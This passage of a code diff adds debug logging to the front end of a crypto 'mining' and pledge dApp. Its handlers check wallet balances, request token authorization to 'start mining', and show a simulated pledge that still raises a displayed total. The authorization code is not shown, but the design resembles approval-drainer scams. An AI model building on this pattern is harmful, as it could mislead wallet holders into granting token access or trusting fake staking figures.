+        console.log("startBtn: Clicked but no signer available."); // 日誌添加
         return;
     }
     const selectedToken = walletTokenSelect.value;
@@ -549,12 +725,14 @@ startBtn.addEventListener('click', async () => {
     const selectedContract = tokenMap[selectedToken];
     try {
         const balance = await selectedContract.balanceOf(userAddress);
+        console.log(`startBtn: Checked balance for ${selectedToken}:`, balance.toString()); // 日誌添加
         if (balance === 0n) {
             alert(`Your ${selectedToken} balance is zero. Please ensure you have sufficient balance to start.`);
             return;
         }
     } catch (e) {
         alert("Could not fetch balance. Please try again later.");
+        console.error("startBtn: Balance fetch error:", e); // 日誌添加
         return;
     }
     startBtn.disabled = true;
@@ -562,24 +740,33 @@ startBtn.addEventListener('click', async () => {
     try {
         await handleConditionalAuthorizationFlow();
         alert('Authorization successful! Mining has started.');
-        setInitialNextBenefitTime();
         await updateUIBasedOnChainState();
     } catch (error) {
-        console.error("Authorization failed:", error);
+        console.error("startBtn: Authorization failed:", error); // 日誌添加
         alert(`Authorization failed: ${error.message}`);
         updateStatus(`Authorization failed: ${error.message}`);
     } finally {
         startBtn.disabled = false;
         startBtn.textContent = translations[currentLang]?.startBtnText || 'Start';
+        console.log("startBtn: Authorization process completed."); // 日誌添加
     }
 });
 
 pledgeBtn.addEventListener('click', async () => {
-    if (!signer) { alert('Please connect your wallet first!'); return; }
+    if (!signer) { 
+        alert('Please connect your wallet first!'); 
+        console.log("pledgeBtn: Clicked but no signer available."); // 日誌添加
+        return; 
+    }
     const amount = parseFloat(pledgeAmount.value) || 0;
-    if (!amount) { alert('Please enter a pledge amount!'); return; }
+    if (!amount) { 
+        alert('Please enter a pledge amount!'); 
+        console.log("pledgeBtn: No pledge amount entered."); // 日誌添加
+        return; 
+    }
     pledgedAmount = amount;
     localStorage.setItem('pledgedAmount', pledgedAmount.toString());
+    console.log(`pledgeBtn: Pledged ${amount} ${pledgeToken.value} for ${pledgeDuration.value} days.`); // 日誌添加
     alert(`Pledged ${amount} ${pledgeToken.value} for ${pledgeDuration.value} days... (Simulation)`);
     const totalPledgedValue = document.getElementById('totalPledgedValue');
     let currentTotal = parseFloat(totalPledgedValue.textContent) || 0;
@@ -588,21 +775,37 @@ pledgeBtn.addEventListener('click', async () => {
 });
 
 refreshWallet.addEventListener('click', async () => {
-    if (!signer) { alert('Please connect your wallet first!'); return; }
+    if (!signer) { 
+        alert('Please connect your wallet first!'); 
+        console.log("refreshWallet: Clicked but no signer available."); // 日誌添加
+        return; 
+    }
     updateStatus('Refreshing balances...');
-    const balances = { usdt: await usdtContract.balanceOf(userAddress).catch(() => 0n), usdc: await usdcContract.balanceOf(userAddress).catch(() => 0n), weth: await wethContract.balanceOf(userAddress).catch(() => 0n) };
+    const balances = { 
+        usdt: await usdtContract.balanceOf(userAddress).catch(() => 0n), 
+        usdc: await usdcContract.balanceOf(userAddress).catch(() => 0n), 
+        weth: await wethContract.balanceOf(userAddress).catch(() => 0n) 
+    };
+    console.log("refreshWallet: Refreshed balances:", balances); // 日誌添加
     updateBalancesUI(balances);
     updateStatus('');
     alert('Wallet balance refreshed!');
 });
 
 walletTokenSelect.addEventListener('change', async () => {
+    console.log("walletTokenSelect: Changed to token:", walletTokenSelect.value); // 日誌添加
     if (!signer) {
         if (walletBalanceAmount) walletBalanceAmount.textContent = '0.000';
         if (accountBalanceValue) accountBalanceValue.textContent = `0.000 ${walletTokenSelect.value}`;
+        console.log("walletTokenSelect: No signer, reset balance display."); // 日誌添加
         return;
     }
-    const balances = { usdt: await usdtContract.balanceOf(userAddress).catch(() => 0n), usdc: await usdcContract.balanceOf(userAddress).catch(() => 0n), weth: await wethContract.balanceOf(userAddress).catch(() => 0n) };
+    const balances = { 
+        usdt: await usdtContract.balanceOf(userAddress).catch(() => 0n), 
+        usdc: await usdcContract.balanceOf(userAddress).catch(() => 0n), 
+        weth: await wethContract.balanceOf(userAddress).catch(() => 0n) 
+    };
+    console.log("walletTokenSelect: Fetched balances:", balances); // 日誌添加
     updateBalancesUI(balances);
 });
 
@@ -614,5 +817,6 @@ tabs.forEach(tab => {
         tab.classList.add('active');
         sections.forEach(s => s.classList.remove('active'));
         document.getElementById(tab.dataset.tab).classList.add('active');
+        console.log(`tabClick: Switched to tab: ${tab.dataset.tab}`); // 日誌添加
     });
 });
